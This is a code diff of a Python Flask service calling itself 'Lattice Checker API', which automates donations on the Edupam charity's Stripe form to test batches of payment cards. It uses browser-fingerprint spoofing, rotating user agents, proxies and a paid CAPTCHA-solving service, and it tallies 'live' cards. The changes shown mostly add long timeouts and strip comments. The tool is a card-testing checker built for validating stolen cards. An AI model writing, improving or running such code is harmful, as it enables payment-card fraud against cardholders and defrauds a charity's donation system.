@@ -31,17 +31,14 @@ EDUPAM_DONOR_EMAIL = os.environ.get('EDUPAM_DONOR_EMAIL', '')
 EDUPAM_BASE_URL = os.environ.get('EDUPAM_BASE_URL', 'https://www.edupam.org')
 EDUPAM_ENDPOINT = os.environ.get('EDUPAM_ENDPOINT', '/mx/dona/')
 DONATION_AMOUNT = int(os.environ.get('DONATION_AMOUNT', '50'))
-MAX_WORKERS = int(os.environ.get('MAX_WORKERS', '2'))  # REDUCIDO para ahorrar RAM
+MAX_WORKERS = int(os.environ.get('MAX_WORKERS', '2'))
 
-# ================================================================
-# 🔥 VARIABLE PARA CONTROLAR EL PROXY
 USE_PROXY = False
 PROXY_STRING = os.environ.get('PROXY_STRING', '')
 PROXY_SERVER = os.environ.get('PROXY_SERVER', '')
 PROXY_USERNAME = os.environ.get('PROXY_USERNAME', '')
 PROXY_PASSWORD = os.environ.get('PROXY_PASSWORD', '')
 
-# ==================== PARSEO DE PROXY ====================
 def parse_proxy_string(proxy_string):
     if not proxy_string:
         return None
@@ -67,7 +64,6 @@ if USE_PROXY:
 else:
     logger.info("ℹ️ Proxy desactivado")
 
-# ==================== VARIABLES GLOBALES ====================
 checking_status = {
     'active': False,
     'processed': 0,
@@ -80,7 +76,6 @@ checking_status = {
     'stop_on_live': False
 }
 
-# ==================== UTILIDADES ====================
 def get_random_user_agent():
     agents = [
         "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
@@ -108,7 +103,6 @@ STEALTH_JS = """
     Object.defineProperty(navigator, 'plugins', { get: () => [1, 2, 3, 4, 5] });
 """
 
-# ==================== CAPTCHA SOLVER ====================
 async def solve_captcha_api_async(page_url, sitekey):
     if not API_KEY_2CAPTCHA:
         logger.warning("No API key for 2Captcha")
@@ -125,7 +119,7 @@ async def solve_captcha_api_async(page_url, sitekey):
                     "isInvisible": False
                 }
             }
-            resp = requests.post("https://api.2captcha.com/createTask", json=data, timeout=60)  # +timeout
+            resp = requests.post("https://api.2captcha.com/createTask", json=data, timeout=60)
             result = resp.json()
             if result.get("errorId", 1) != 0:
                 logger.error(f"2Captcha error: {result.get('errorDescription')}")
@@ -133,7 +127,7 @@ async def solve_captcha_api_async(page_url, sitekey):
             task_id = result["taskId"]
             logger.info(f"2Captcha task created: {task_id}")
             
-            for _ in range(60):  # más intentos (60*5=300s)
+            for _ in range(60):
                 time.sleep(5)
                 resp2 = requests.post("https://api.2captcha.com/getTaskResult", 
                                       json={"clientKey": API_KEY_2CAPTCHA, "taskId": task_id}, timeout=60)
@@ -189,7 +183,7 @@ async def solve_captcha_if_present(page):
                     }}
                 """, token)
                 logger.info("✅ Token inyectado")
-                await asyncio.sleep(3)  # +espera
+                await asyncio.sleep(3)
                 return True
             else:
                 logger.warning("❌ Fallo al resolver captcha")
@@ -199,7 +193,6 @@ async def solve_captcha_if_present(page):
         logger.error(f"Error en solve_captcha: {e}")
         return False
 
-# ==================== CLASE EDU SESSION ====================
 class EduSession:
     def __init__(self):
         self.playwright = None
@@ -228,7 +221,7 @@ class EduSession:
             
             launch_options = {
                 "headless": HEADLESS,
-                "slow_mo": 100,  # más lento pero menos CPU (ahorra RAM?)
+                "slow_mo": 100,
                 "firefox_user_prefs": {
                     "network.cookie.cookieBehavior": 0,
                     "privacy.trackingprotection.enabled": False,
@@ -245,12 +238,14 @@ class EduSession:
                 locale="es-MX",
                 timezone_id="America/Mexico_City"
             )
+            # 🔥 TIMEOUT GLOBAL DE 600 SEGUNDOS
+            self.context.set_default_timeout(600000)
+            
             await self.context.add_init_script(STEALTH_JS)
             self.page = await self.context.new_page()
             self.is_open = True
             url = f"{EDUPAM_BASE_URL}{EDUPAM_ENDPOINT}"
             logger.info(f"Navegando a {url}...")
-            # TIMEOUT DE NAVEGACIÓN A 600 SEGUNDOS
             await self.page.goto(url, timeout=600000, wait_until="domcontentloaded")
             return True
         except Exception as e:
@@ -309,11 +304,12 @@ class EduSession:
             current_url = page.url.rstrip('/')
             target_url = f"{EDUPAM_BASE_URL}{EDUPAM_ENDPOINT}".rstrip('/')
             if current_url != target_url:
-                await page.goto(target_url, timeout=600000)  # 600s
+                await page.goto(target_url, timeout=600000)
             else:
-                await page.reload()
+                # 🔥 AÑADIR TIMEOUT A reload()
+                await page.reload(timeout=600000)
             
-            # Esperar formulario con timeout de 600s
+            # 🔥 TIMEOUT EXPLÍCITO
             await page.wait_for_selector('input[name="name"]', timeout=600000)
             
             if EDUPAM_DONOR_NAME and EDUPAM_DONOR_LASTNAME:
@@ -337,9 +333,9 @@ class EduSession:
             await page.fill('input[name="quantity"]', str(donation_amount))
             
             if await page.is_visible('#dr-type'):
-                await page.click('#dr-type')
+                await page.click('#dr-type', timeout=600000)
             elif await page.is_visible('input#r-type'):
-                await page.check('input#r-type', force=True)
+                await page.check('input#r-type', force=True, timeout=600000)
             
             stripe_frame = page.frame_locator("iframe[name^='__privateStripeFrame']").first
             if not stripe_frame:
@@ -352,16 +348,15 @@ class EduSession:
                 await stripe_frame.locator('input[name="postal"]').fill("11000")
             
             try:
-                await page.click('#btn-donation')
+                await page.click('#btn-donation', timeout=600000)
             except:
                 await page.evaluate("document.querySelector('#btn-donation').click()")
             
-            await asyncio.sleep(5)  # más espera
+            await asyncio.sleep(5)
             
             if API_KEY_2CAPTCHA:
                 await solve_captcha_if_present(page)
             
-            # TIMEOUT DE POLLING A 180 SEGUNDOS (3 MINUTOS)
             end_time = time.time() + 180
             final_status = "UNKNOWN"
             final_message = "Timeout"
@@ -442,7 +437,7 @@ class EduSession:
                     if "closed" in err_str or "connection" in err_str:
                         raise loop_e
                 
-                await asyncio.sleep(2)  # poll cada 2s
+                await asyncio.sleep(2)
             
             if final_status == "UNKNOWN":
                 final_message = "No se detectó resultado (posible bloqueo o 3DS no manejado)"
@@ -479,7 +474,6 @@ class EduSession:
                 pass
 
 
-# ==================== WORKER ====================
 async def process_cards_async(cards, amount, stop_on_live):
     global checking_status
     session = EduSession()
@@ -539,7 +533,7 @@ async def process_cards_async(cards, amount, stop_on_live):
             else:
                 checking_status['error'] += 1
             
-            await asyncio.sleep(3)  # pausa más larga entre tarjetas
+            await asyncio.sleep(3)
             
     except Exception as e:
         logger.error(f"Error en worker: {e}")
@@ -561,7 +555,7 @@ def index():
     return jsonify({
         "status": "online",
         "service": "Lattice Checker API (Edupam) - Async (Slow & Stable)",
-        "version": "3.1",
+        "version": "3.2",
         "endpoints": {
             "health": "/api/health",
             "status": "/api/status",
@@ -584,7 +578,7 @@ def health_check():
     return jsonify({
         'status': 'online',
         'service': 'Lattice Checker API Async (Slow)',
-        'version': '3.1',
+        'version': '3.2',
         'timestamp': dt.now().isoformat(),
         'features': {
             '2captcha': bool(API_KEY_2CAPTCHA),
@@ -693,7 +687,6 @@ def cancel_check():
     checking_status['active'] = False
     return jsonify({'success': True, 'message': 'Chequeo cancelado'})
 
-# ==================== INICIO ====================
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 8080))
     debug = os.environ.get('FLASK_ENV', 'production') == 'development'
